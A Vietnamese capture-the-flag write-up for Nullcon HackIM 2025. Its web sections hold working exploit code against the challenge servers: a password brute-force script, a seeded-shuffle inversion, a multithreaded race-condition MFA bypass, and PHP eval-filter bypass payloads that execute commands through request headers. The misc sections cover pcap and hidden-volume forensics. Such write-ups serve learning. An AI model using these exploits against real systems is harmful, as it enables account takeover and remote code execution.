---
title: "[Write-up] Nullcon Berlin HackIM 2025 CTF"
published: 2025-09-05
tags: [CTF, Nullcon]
category: Write-up
description: Thật vui khi ghi được điểm trong cuộc thii
draft: false
image: /assets/data/2025-09-06-13-02-31.png
---

# web

## grandmas_notes

> My grandma is into vibe coding and has developed this web application to help her remember all the important information. It would work be great, if she wouldn't keep forgetting her password, but she's found a solution for that, too.

Đọc `source code` có thể thấy ở trang đăng nhập nó sẽ kiểm tra mật khẩu người dùng nhập có bao nhiêu kí tự đúng với tối đa là 16 kí tự

```python
$correct = 0;
$limit = min(count($chars), count($stored));
for ($i = 0; $i < $limit; $i++) {
    $enteredCharHash = sha256_hex($chars[$i]);
    if (hash_equals($stored[$i]['char_hash'], $enteredCharHash)) {
        $correct++;
    } else {
        break;
    }
}
$_SESSION['flash'] = "Invalid password, but you got {$correct} characters correct!";
```

Ta có thể `brute force` từng kí tự của mật khẩu tài khoản `admin` đăng nhập là lấy được flag

```python
import requests, string

BASE = "http://52.59.124.14:5015"
CHARSET = string.ascii_letters + string.digits + "_{}!@#$%^&*()-=+[];:,.?/ "

s = requests.Session()

def try_password(pw):
    r = s.post(BASE + "/login.php",
               data={"username":"admin","password":pw},
               allow_redirects=True)
    if "got" in r.text:
        import re
        m = re.search(r'got (\d+) characters correct', r.text)
        if m: return int(m.group(1))
    return 0

def recover(maxlen=16):
    pw=""
    for pos in range(maxlen):
        hit=None
        for ch in CHARSET:
            attempt = pw + ch
            correct = try_password(attempt)
            if correct == pos+1:
                pw += ch
                print(f"[+] pos {pos}: {ch}")
                hit=True
                break
        if not hit:
            print("[*] kết thúc ở length", len(pw))
            break
    return pw

if __name__=="__main__":
    password = recover()
    print("[*] admin password =", password)

#YzUnh2ruQix9mBWv
```

## pwgen

> Password policies aren't always great. That's why we generate passwords for our users based on a strong master password!

Đọc `source code` có thể thấy `flag` được random thông qua input `?nthpw=` mỗi lần khác nhau với seed cố định `srand(0x1337)` nên chuỗi `str_shuffle` sẽ luôn giống nhau mỗi lần

```python
$shuffle_count = abs(intval($_GET['nthpw']));

if($shuffle_count > 1000 or $shuffle_count < 1) {
    echo "Bad shuffle count! We won't have more than 1000 users anyway, but we can't tell you the master password!";
    echo "Take a look at /?source";
    die();
}

srand(0x1337); // the same user should always get the same password!

for($i = 0; $i < $shuffle_count; $i++) {
    $password = str_shuffle($FLAG);
}

if(isset($password)) {
    echo "Your password is: '$password'";
}
```

```
Your password is: '7F6_23Ha8:5E4N3_/e27833D4S5cNaT_1i_O46STLf3r-4AH6133bdTO5p419U0n53Rdc80F4_Lb6_65BSeWb38f86{dGTf4}eE8__SW4Dp86_4f1VNH8H_C10e7L62154'
PWgen

To view the source code, click here.
```

Khai thác đơn giản là ta có thể viết mã giải ngược lại `password` bị random bất kì thông qua tham số `?nthpw=`
với seed cố định `srand(0x1337)`

```php
<?php

$obs = "7F6_23Ha8:5E4N3_/e27833D4S5cNaT_1i_O46STLf3r-4AH6133bdTO5p419U0n53Rdc80F4_Lb6_65BSeWb38f86{dGTf4}eE8__SW4Dp86_4f1VNH8H_C10e7L62154";

$n = strlen($obs);

function burn_one_shuffle_calls($n) {
    for ($i = $n - 1; $i > 0; $i--) {
        rand(0, $i);
    }
}

function get_perm_for_current_rng_state($n) {
    $perm = range(0, $n - 1);
    for ($i = $n - 1; $i > 0; $i--) {
        $j = rand(0, $i);
        $tmp = $perm[$i];
        $perm[$i] = $perm[$j];
        $perm[$j] = $tmp;
    }
    return $perm;
}

function invert_perm($perm) {
    $n = count($perm);
    $inv = array_fill(0, $n, 0);
    for ($pos = 0; $pos < $n; $pos++) {
        $inv[$perm[$pos]] = $pos;
    }
    return $inv;
}

function apply_inverse($S, $inv) {
    $n = count($inv);
    $orig_chars = array_fill(0, $n, '');
    for ($k = 0; $k < $n; $k++) {
        $pos_in_S = $inv[$k];
        $orig_chars[$k] = $S[$pos_in_S];
    }
    return implode('', $orig_chars);
}

$s = $obs;

for ($nth = 1; $nth <= 1000; $nth++) {
    srand(0x1337);

    for ($k = 1; $k < $nth; $k++) {
        burn_one_shuffle_calls($n);
    }

    $perm = get_perm_for_current_rng_state($n);
    $inv  = invert_perm($perm);
    $candidate = apply_inverse(str_split($s), $inv);

    echo str_pad($nth, 4, ' ', STR_PAD_LEFT) . " -> " . $candidate . PHP_EOL;
}

```

## webby

> MFA is awesome! Even if someone gets our login credentials, and they still can't get our secrets!

source code

```python
import web
import secrets
import random
import tempfile
import hashlib
import time
import shelve
import bcrypt
from web import form
web.config.debug = False
urls = (
  '/', 'index',
  '/mfa', 'mfa',
  '/flag', 'flag',
  '/logout', 'logout',
)
app = web.application(urls, locals())
render = web.template.render('templates/')
session = web.session.Session(app, web.session.ShelfStore(shelve.open("/tmp/session.shelf")))
FLAG = open("/tmp/flag.txt").read()

def check_user_creds(user,pw):
    users = {
        # Add more users if needed
        'user1': 'user1',
        'user2': 'user2',
        'user3': 'user3',
        'user4': 'user4',
        'admin': 'admin',

    }
    try:
        return users[user] == pw
    except:
        return False

def check_mfa(user):
    users = {
        'user1': False,
        'user2': False,
        'user3': False,
        'user4': False,
        'admin': True,
    }
    try:
        return users[user]
    except:
        return False


login_Form = form.Form(
    form.Textbox("username", description="Username"),
    form.Password("password", description="Password"),
    form.Button("submit", type="submit", description="Login")
)
mfatoken = form.regexp(r"^[a-f0-9]{32}$", 'must match ^[a-f0-9]{32}$')
mfa_Form = form.Form(
    form.Password("token", mfatoken, description="MFA Token"),
    form.Button("submit", type="submit", description="Submit")
)

class index:
    def GET(self):
        try:
            i = web.input()
            if i.source:
                return open(__file__).read()
        except Exception as e:
            pass
        f = login_Form()
        return render.index(f)

    def POST(self):
        f = login_Form()
        if not f.validates():
            session.kill()
            return render.index(f)
        i = web.input()
        if not check_user_creds(i.username, i.password):
            session.kill()
            raise web.seeother('/')
        else:
            session.loggedIn = True
            session.username = i.username
            session._save()

        if check_mfa(session.get("username", None)):
            session.doMFA = True
            session.tokenMFA = hashlib.md5(bcrypt.hashpw(str(secrets.randbits(random.randint(40,65))).encode(),bcrypt.gensalt(14))).hexdigest()
            #session.tokenMFA = "acbd18db4cc2f85cedef654fccc4a4d8"
            session.loggedIn = False
            session._save()
            raise web.seeother("/mfa")
        return render.login(session.get("username",None))

class mfa:
    def GET(self):
        if not session.get("doMFA",False):
            raise web.seeother('/login')
        f = mfa_Form()
        return render.mfa(f)

    def POST(self):
        if not session.get("doMFA", False):
            raise web.seeother('/login')
        f = mfa_Form()
        if not f.validates():
            return render.mfa(f)
        i = web.input()
        if i.token != session.get("tokenMFA",None):
            raise web.seeother("/logout")
        session.loggedIn = True
        session._save()
        raise web.seeother('/flag')


class flag:
    def GET(self):
        if not session.get("loggedIn",False) or not session.get("username",None) == "admin":
            raise web.seeother('/')
        else:
            session.kill()
            return render.flag(FLAG)


class logout:
    def GET(self):
        session.kill()
        raise web.seeother('/')

application = app.wsgifunc()
if __name__ == "__main__":
    app.run()
```

Đọc `source code` ta dễ thấy có thể khai thác `race-condition (điều kiện tranh chấp)`

Trong index.POST:

- Khi login đúng, code lưu session với `loggedIn = True` và `username = 'admin'` ngay lập tức `session._save()`

- Sau đó mới kiểm tra MFA: đặt `doMFA = True`, tạo tokenMFA `(bcrypt cost 14 khá chậm)`, rồi đặt lại `loggedIn = False` và `session._save()`

Trong “khoảng thời gian” bcrypt đang chạy, session trên đĩa đã ở trạng thái `loggedIn=True`. Lúc này gửi đồng thời một request `GET /flag` (cùng cookie session) trước khi dòng đặt `loggedIn=False` chạy xong, sẽ qua check và lấy flag

```python
import requests, threading, time
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE = "http://52.59.124.14:5010"
USER = "admin"
PASS = "admin"

s = requests.Session()
s.headers.update({"User-Agent": "race-poc"})

def try_flag():
    # Không theo redirect để thấy 200 ngay khi lọt
    r = s.get(f"{BASE}/flag", allow_redirects=False, timeout=5)
    if r.status_code == 200 and ("ENO{" in r.text or "FLAG" in r.text or "CTF" in r.text):
        print("[+] GOT FLAG!")
        print(r.text)
        return True
    return False

def spam_flag(stop_event):
    # Spam liên tục cho tới khi có flag
    while not stop_event.is_set():
        if try_flag():
            stop_event.set()
            break

def main():
    # Lấy cookie session ban đầu
    s.get(f"{BASE}/", timeout=5)

    stop = threading.Event()

    # 1) Mở bãi bắn /flag đa luồng
    workers = 50
    threads = []
    for _ in range(workers):
        t = threading.Thread(target=spam_flag, args=(stop,), daemon=True)
        t.start()
        threads.append(t)

    # 2) Gửi POST / để kích hoạt cửa sổ race (bcrypt cost=14 làm chậm)
    data = {"username": USER, "password": PASS, "submit": "Login"}
    # Không follow redirect để tiết kiệm thời gian
    r = s.post(f"{BASE}/", data=data, allow_redirects=False, timeout=10)

    # 3) Chờ tới khi có flag hoặc hết thời gian
    t0 = time.time()
    timeout = 20
    while time.time() - t0 < timeout and not stop.is_set():
        time.sleep(0.05)

    if not stop.is_set():
        print("[-] Chưa chộp được. Tăng số luồng hoặc chạy lại (do timing).")

if __name__ == "__main__":
    main()

```

## Slasher

> Slashing all the slashes...

source code

```php
<?php
ini_set("error_reporting", 0);
ini_set("short_open_tag", "Off");

set_error_handler(function($_errno, $errstr) {
    echo "Something went wrong!";
});

if(isset($_GET['source'])) {
    highlight_file(__FILE__);
    die();
}

include "flag.php";

$output = null;
if(isset($_POST['input']) && is_scalar($_POST['input'])) {
    $input = $_POST['input'];
    $input = htmlentities($input,  ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    $input = addslashes($input);
    $input = addcslashes($input, '+?<>&v=${}%*:.[]_-0123456789xb `;');
    try {
        $output = eval("$input;");
    } catch (Exception $e) {
        // nope, nothing
    }
}
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Slasher</title>
    <link rel="stylesheet" href="style.css">
    <script>
        function copyResult() {
            const el = document.getElementById('resultText');
            if (!el) return;
            const rng = document.createRange();
            rng.selectNodeContents(el);
            const sel = window.getSelection();
            sel.removeAllRanges(); sel.addRange(rng);
            try { document.execCommand('copy'); } catch(e){}
            sel.removeAllRanges();
            const btn = document.getElementById('copyBtn');
            if(btn){
                const original = btn.textContent;
                btn.textContent = 'Copied!';
                setTimeout(()=>btn.textContent=original, 1200);
            }
        }
    </script>
</head>
<body>
    <div class="container">
        <header class="header">
            <div class="brand">
                <div class="logo" aria-hidden="true"></div>
                <h1>Slasher</h1>
            </div>
            <nav class="actions">
                <a class="kbd" href="/?source" title="View source">view source</a>
            </nav>
        </header>

        <section class="card">
            <div class="head">
                <strong>Eval your slashes</strong>
                <span class="kbd">POST</span>
            </div>
            <div class="body">
                <form action="/" method="post" autocomplete="off" spellcheck="false">
                    <label for="input">Input your content</label>
                    <div class="input-row">
                        <input id="input" name="input" type="text" placeholder='e.g. "1+2"' />
                        <button class="btn" type="submit">Submit</button>
                    </div>
                </form>

                <?php if($output) { ?>
                    <div class="result-title">Your result is:</div>
                    <div class="result" id="resultText"><?php echo htmlentities($output); ?></div>
                    <div class="actions" style="margin-top:10px">
                        <button id="copyBtn" class="btn btn-secondary" type="button" onclick="copyResult()">Copy result</button>
                    </div>
                <?php } ?>

                <p class="notice">
                    To view the source code, <a href="/?source">click here</a>.
                </p>
            </div>
        </section>

        <footer class="footer">
            <span>© <?php echo date('Y'); ?> gehaxelt. Made with <3 and AI</span>
        </footer>
    </div>
</body>
</html>
```

Để có thể đọc được tệp `flag.php` chúng ta phải bypass được hàm `eval`

```php
    $input = addslashes($input);
    $input = addcslashes($input, '+?<>&v=${}%*:.[]_-0123456789xb `;');
    try {
        $output = eval("$input;");
    } catch (Exception $e) {
        // nope, nothing
    }

```

Có thể thấy `input` người dùng nhập vào đã bị filter bới hàm `addcslashes` nó sẽ thêm `\` vào các kí tự ở trên bao gồm cả khoảng trắng

Tất nhiên còn rất nhiều hàm nguy hiểm không bị filter như `system` nhưng `system` cần dấu `'` nên sẽ không thành công. Chúng ta chỉ dùng được những hàm khong cần `'`

- Hàm `getcwd()` sẽ trả về đường dẫn thư mục hiện tại
- Hàm `scandir()` sẽ liệt kê tất cả các file trong thư mục đấy
- Sử dụng `echo()` hoặc `print()` để in output ra màn hình

![](/assets/data/2025-09-06-13-54-07.png)

```
print(join(scandir(getcwd())))
```

Chúng ta đã liệt kê được các file trong thư mục và thấy có `flag.php`. Vấn đề là làm sao để đọc được file này

- Sử dụng `redfile()` để đọc file nhưng phải lấy được một file cụ thể
- hàm `end()` và `current()` chỉ lấy được file ở cuối mảng hoặc đầu mảng
- hàm `next()` và `prev()` có thể dịch chuyển trong mảng nhưng `x v` đã bị filter. Vì `php` không phân biệt chữ hoa chữ thường nên có thể dùng chữ in hoa `X V`. Vấn đề là `next()` `prve()` chỉ dùng được con trỏ nội bộ cần có `$` nên cũng không khả thi

Sau đó mình đã phát hiện ra 1 hàm khá mạnh có thể sử dụng tất cả các lệnh tùy ý

- `getallheaders()` trong PHP dùng để lấy toàn bộ HTTP request headers mà client gửi lên server dưới dạng một mảng (associative array). Mình sẽ giả một header đặt ở cuối `body` sau đó sử dụng `end()` để lấy header này và thực thi

```
X: flag.php

print(readfile(end(getallheaders())))
```

hoặc có thể sử dụng system

```
X: cat flag.php

system(end(getallheaders()))
```

![](/assets/data/2025-09-06-14-08-59.png)

## dogfinder

> I like dogs, so I wrote this awesome dogfinder page. Somewhere on the filesystem is a nice treat for you.

# misc

## usbstorage

> I attached my friend's USB drive to my laptop and accidently copied a private file, which I immediately deleted. But my friend still somehow got the file from looking at the USB message their drive recorded...

Trong phần đính kèm, có cung cấp tệp pcapng với thông báo USB Mass Storage:

Sử dụng `binwalk` để trích xuất tệp được truyền qua `USB`

```
binwalk -e usbstorage.pcapng

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
1343984       0x1481F0        gzip compressed data, from Unix, last modified: 1970-01-01 00:00:00 (null date)
```

```
$tar -xvf 1481F0.tar
flag.gz

$gunzip flag.gz

$cat flag
ENO{USB_STORAGE_SHOW_ME_THE_FLAG_PLS}
```

## atruecryptographer

> You know what I like most? Nullcon aftermovies and Kerckhoffs's principle! But since I'm a true cryptographer and a 1337 h4xx0r, I can even provide you my password without you ever finding my secrets: U"gkXYg;^#qXxJ(jm\*jKik|N/gezj7)z<br>
> My question is: Are you a true cryptographer, too? Prove it by finding my secret!

Một tệp `mp4` mở lên trông khá bình thường nhưng tôi nhận ra kích thước của tệp khá nặng

Đề bài có gợi ý `atruecryptographer` nên tôi khá chắc rằng tệp này đã bị độn một file-container `TrueCrypt/VeraCrypt` dạng hidden được ngụy trang thành MP4

```
nullcon-aftermovie.mp4
┌─────────────── 0 … 64 KiB ───────────────┐
│ Header MP4 (đè lên outer-header TC)     │
├────────── 64 KiB … (gần MIN_OFF) ────────┤
│ Hidden header + dữ liệu hidden volume    │  ← cryptsetup/VeraCrypt đọc phần này
├────────────── (từ MIN_OFF trở đi) ───────┤
│ Dữ liệu video thật (mdat được tham chiếu)│  ← trình phát MP4 chỉ đọc phần này
└───────────────────────────────────────────┘

```

MP4 player bỏ qua vùng “container” vì không được stco/co64 tham chiếu.

`cryptsetup/VeraCrypt` lại coi file đó như một ảnh đĩa mã hóa, tìm hidden-header ở 64 KiB, giải mã và map ra /dev/mapper/tcsteg

Sử dụng `cryptsetup` để mở sau đó mount phân vùng ta sẽ đọc được flag

```
$sudo cryptsetup tcryptOpen --tcrypt-hidden "nullcon-aftermovie.mp4" tcsteg
$sudo mount -o ro /dev/mapper/tcsteg /mnt/secret
$cat /mnt/secret/flag.txt
ENO{Tru3_Cryp7_St3G0_F04_Ze_W1n!}
```
